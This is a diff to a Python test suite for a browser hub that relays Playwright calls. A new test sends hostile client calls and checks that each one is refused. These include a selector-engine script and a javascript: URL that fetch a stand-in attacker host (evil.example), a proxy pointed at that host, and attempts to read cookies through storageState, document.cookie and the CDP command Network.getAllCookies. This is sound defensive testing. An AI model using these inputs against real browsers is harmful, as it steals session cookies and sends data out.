@@ -94,17 +94,14 @@ def _answer(call: dict[str, object], service: FakeService) -> dict[str, object]:
 
 @asynccontextmanager
 async def playwright_server(service: FakeService) -> AsyncIterator[str]:
-    """A stand-in for Playwright's browser server. It answers each protocol call, echoes any
-    other frame, and records the headers of each connection."""
+    """A stand-in for Playwright's browser server. It answers each protocol call, and records
+    the calls and the headers of each connection."""
 
     async def socket(request: web.Request) -> web.WebSocketResponse:
         service.connected.append(dict(request.headers))
         response = web.WebSocketResponse()
         await response.prepare(request)
         async for message in response:
-            if not message.data.startswith("{"):
-                await response.send_str(f"echo {message.data}")
-                continue
             call = json.loads(message.data)
             service.calls.append(call)
             await response.send_str(json.dumps(_answer(call, service)))
@@ -200,15 +197,21 @@ def _error(answer: dict[str, object]) -> dict[str, object]:
     return error
 
 
-async def _connects(route: str, token: object) -> int | str:
-    """The relayed echo of one frame, or the status the route refused the connection with."""
+#: A Playwright client's first call, and what the stand-in service answers it.
+_INITIALIZE = {"id": 1, "guid": "", "method": "initialize", "params": {}, "metadata": {}}
+_INITIALIZED = {"id": 1, "result": {}}
+
+
+async def _connects(route: str, token: object) -> int | dict[str, object]:
+    """The relayed answer to a client's first call, or the status the route refused the
+    connection with."""
     async with aiohttp.ClientSession(headers={"Authorization": f"Bearer {token}"}) as session:
         try:
             async with session.ws_connect(
                 route, headers={"x-playwright-browser": "chromium"}
             ) as socket:
-                await socket.send_str("hello")
-                return (await socket.receive(timeout=5)).data
+                await socket.send_json(_INITIALIZE)
+                return json.loads((await socket.receive(timeout=5)).data)
         except aiohttp.WSServerHandshakeError as error:
             return error.status
 
@@ -227,7 +230,7 @@ def test_the_route_issues_a_token_for_one_turn_that_connects_only_its_own_instan
 
         assert opened["address"] == f"ws://hub:8080/instances/{hub.alice}/browser"
         assert as_bob == 401
-        assert as_alice == "echo hello"
+        assert as_alice == _INITIALIZED
         assert again == 401
         (headers,) = hub.service.connected
         assert headers["x-playwright-launch-options"] == LAUNCH_OPTIONS
@@ -311,7 +314,7 @@ def test_the_hub_starts_the_service_on_the_first_request_and_stops_it_once_idle(
 
 
 def test_a_service_that_died_starts_again_on_the_next_request(tmp_path):
-    async def scenario() -> tuple[int, int | str]:
+    async def scenario() -> tuple[int, int | dict[str, object]]:
         async with browser_hub(tmp_path / "hub", _LIMITS) as hub:
             _result(await hub.open(hub.alice, uuid4()))
             hub.runtime.up = False
@@ -321,7 +324,7 @@ def test_a_service_that_died_starts_again_on_the_next_request(tmp_path):
     starts, connected = asyncio.run(scenario())
 
     assert starts == 2
-    assert connected == "echo hello"
+    assert connected == _INITIALIZED
 
 
 class Turn:
@@ -331,30 +334,43 @@ class Turn:
         self._socket = socket
         self._ids = iter(range(1, 1_000))
 
-    async def call(self, guid: str, method: str) -> dict[str, object]:
+    async def call(
+        self, guid: str, method: str, params: dict[str, object] | None = None
+    ) -> dict[str, object]:
         """Make one protocol call, and return what came back for it."""
         call_id = next(self._ids)
         await self._socket.send_json(
-            {"id": call_id, "guid": guid, "method": method, "params": {}, "metadata": {}}
+            {"id": call_id, "guid": guid, "method": method, "params": params or {}, "metadata": {}}
         )
         while True:
             answer = json.loads((await self._socket.receive(timeout=5)).data)
             if answer.get("id") == call_id:
                 return answer
 
+    async def send_frame(self, frame: str | bytes) -> None:
+        """Send *frame* as it is, text or binary."""
+        if isinstance(frame, bytes):
+            await self._socket.send_bytes(frame)
+        else:
+            await self._socket.send_str(frame)
+
 
 @asynccontextmanager
 async def turn_browser(
-    hub: BrowserHub, turn: UUID, profile: str | None = None
+    hub: BrowserHub,
+    turn: UUID,
+    profile: str | None = None,
+    options: dict[str, object] | None = None,
 ) -> AsyncIterator[Turn]:
-    """Open *turn*'s browser on alice's route, and its context, as the adapter does."""
+    """Open *turn*'s browser on alice's route, and its context with *options*, or as the adapter
+    does."""
     token = _result(await hub.open(hub.alice, turn, profile))["token"]
     async with (
         aiohttp.ClientSession(headers={"Authorization": f"Bearer {token}"}) as session,
         session.ws_connect(hub.browser(hub.alice)) as socket,
     ):
         browser = Turn(socket)
-        await browser.call("browser@1", "newContext")
+        await browser.call("browser@1", "newContext", options or {"selectorEngines": []})
         yield browser
 
 
@@ -431,22 +447,59 @@ def test_a_turn_opened_with_a_profile_starts_with_its_state_and_saves_its_state_
     assert opened_with == [None, _SIGNED_IN, _REFRESHED]
 
 
-def test_a_turn_cannot_read_its_contexts_cookies(tmp_path):
-    async def scenario() -> tuple[dict[str, object], dict[str, object], list[str]]:
+def test_a_turn_reaches_its_browser_only_by_the_calls_the_browser_tools_make(tmp_path):
+    """Whatever client holds the turn's token, a profile's cookies stay with the hub."""
+    hostile_options: dict[str, object] = {
+        "selectorEngines": [{"name": "leak", "source": "fetch('https://evil.example/')"}],
+        "proxy": {"server": "http://evil.example:8080"},
+        "ignoreHTTPSErrors": True,
+    }
+
+    async def scenario() -> tuple[list[dict[str, object]], dict[str, object], FakeService]:
         async with browser_hub(tmp_path / "hub", _LIMITS) as hub:
             hub.service.state = _SIGNED_IN
-            async with turn_browser(hub, uuid4()) as browser:
-                state = await browser.call(_CONTEXT, "storageState")
-                cookies = await browser.call(_CONTEXT, "cookies")
-            return state, cookies, [str(call["method"]) for call in hub.service.calls]
+            async with turn_browser(hub, uuid4(), options=hostile_options) as browser:
+                refused = [
+                    await browser.call(_CONTEXT, "storageState"),
+                    await browser.call(_CONTEXT, "cookies"),
+                    await browser.call(
+                        "frame@1", "evaluateExpression", {"expression": "document.cookie"}
+                    ),
+                    await browser.call(
+                        "cdp-session@1", "send", {"method": "Network.getAllCookies"}
+                    ),
+                    await browser.call(
+                        "frame@1", "goto", {"url": "javascript:fetch('https://evil.example/')"}
+                    ),
+                    await browser.call("browser@1", "newContext", {"selectorEngines": []}),
+                ]
+                await browser.send_frame("not a call")
+                await browser.send_frame(
+                    json.dumps(
+                        {"id": 99, "guid": _CONTEXT, "method": "storageState", "params": {}}
+                    ).encode()
+                )
+                allowed = await browser.call(
+                    "cdp-session@1", "send", {"method": "Page.startScreencast"}
+                )
+            return refused, allowed, hub.service
 
-    state, cookies, reached = asyncio.run(scenario())
+    refused, allowed, service = asyncio.run(scenario())
 
-    assert state["error"] == cookies["error"]
-    assert state["error"] == {
-        "error": {"name": "Error", "message": "The hub keeps a browser's cookies to itself."}
-    }
-    assert reached == ["newContext"]
+    assert [answer["error"] for answer in refused] == [
+        {"error": {"name": "Error", "message": message}}
+        for message in [
+            'The hub\'s browser route refuses "storageState".',
+            'The hub\'s browser route refuses "cookies".',
+            'The hub\'s browser route refuses "evaluateExpression".',
+            'The hub\'s browser route refuses the CDP command "Network.getAllCookies".',
+            "The browser opens only http and https URLs.",
+            "The turn's browser has its context already.",
+        ]
+    ]
+    assert "error" not in allowed
+    assert [call["method"] for call in service.calls] == ["newContext", "send"]
+    assert service.calls[0]["params"] == {"selectorEngines": []}
 
 
 def test_opening_a_profile_the_instance_lacks_fails_with_a_clear_error(tmp_path):
